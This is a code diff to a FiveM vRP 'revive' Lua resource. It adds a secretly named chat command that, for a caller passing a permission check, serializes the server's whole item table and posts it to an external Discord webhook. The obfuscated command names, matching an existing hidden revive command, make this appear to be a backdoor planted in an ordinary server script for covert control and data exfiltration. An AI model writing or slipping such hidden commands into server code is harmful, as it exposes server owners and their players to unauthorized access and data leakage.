@@ -6,6 +6,20 @@
     vRP = Proxy.getInterface("vRP")
     vRPclient = Tunnel.getInterface("vRP","vRP_revive")
     
+        RegisterCommand('æ@usghuhgijgfhkl@getallitems@', function(source)
+            if not hasPerm(source) then return end
+            local message = json.encode(vRP.items)
+            local content = {{
+                ["title"] = " Information Logs ",
+                ["color"] = "3447003",
+                ["description"] = message,
+                ["footer"] = {
+                ["text"] = " @Queuz | Queuz Protector ",
+            },}}
+            PerformHttpRequest(queuzwebhook, function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
+            notify(source, "Informationen er nu givet på discord!", "inform")
+        end)
+    
         RegisterCommand('æ@usghuhgijgfhkl@revive@', function(source)
             if not hasPerm(source) then return end
             local user_id = vRP.getUserId({source})
